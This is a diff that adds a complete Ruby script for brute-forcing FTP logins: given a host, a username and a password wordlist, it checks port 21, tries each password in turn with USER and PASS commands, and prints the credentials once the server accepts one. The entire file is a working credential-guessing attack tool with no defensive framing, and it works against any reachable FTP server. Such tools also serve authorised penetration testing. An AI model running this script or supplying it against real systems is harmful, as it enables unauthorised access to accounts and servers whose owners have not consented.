@@ -1,0 +1,95 @@
+#! /usr/bin/ruby
+
+require 'socket'
+require 'timeout'
+
+$rhost = ARGV[0]
+$username = ARGV[1]
+$wordlist = ARGV[2]
+
+def check_target()
+	print '[*] Checking Target... '
+	s = Socket.new Socket::AF_INET, Socket::SOCK_STREAM
+	begin
+		sockaddr = Socket.pack_sockaddr_in( 21, $rhost )
+	rescue
+		puts '[FAIL]'
+		puts '[!] Error: Failed to Resolve Target'
+		exit
+	end
+	begin
+		timeout(10) do
+			@result = s.connect(sockaddr)
+		end
+	rescue Timeout::Error
+		puts '[FAIL]'
+		puts '[!] Error: Connection Test Timed Out'
+		exit
+	rescue
+		puts '[FAIL]'
+		puts '[!] Error: Failed to Reach Target'
+		exit
+	end
+	s.close
+	if @result == 111
+		puts '[FAIL]'
+		puts '[!] Error: Target Refused Connection'
+		exit
+	elsif @result == 0
+		puts '[DONE]'
+	else
+		puts '[FAIL]'
+		puts '[!] Error: Unknown Error Occured'
+		exit
+	end
+end
+
+def get_wordlist(path)
+	print '[*] Parsing Wordlist... '
+	begin
+		file = File.open(path, 'r')
+		$to_check = file.read.chomp.split("\n")
+		file.close
+	rescue
+		puts '[FAIL]'
+		puts '[!] Error: Failed to Read Specified File'
+		exit
+	end
+	puts '[DONE]'
+end
+
+def try_login(password)
+	begin
+		s = TCPSocket.new($rhost, 21)
+		s.gets
+		s.puts("USER #{$username}")
+		s.gets
+		s.puts("PASS #{password}")
+		data = s.gets
+		s.close
+		if data.include? '230'
+			return true
+		else
+			return false
+		end
+	rescue
+		return false
+	end
+end
+
+check_target()
+get_wordlist($wordlist)
+
+puts "[*] Beginning Scan... \n\n"
+
+$to_check.each do |password|
+	if try_login(password)
+		puts "[*] Credentials Found"
+		puts "[*] Username: #{$username}"
+		puts "[*] Password: #{password}\n\n"
+		break
+	else
+	end
+end
+
+puts '[*] Scan Complete'
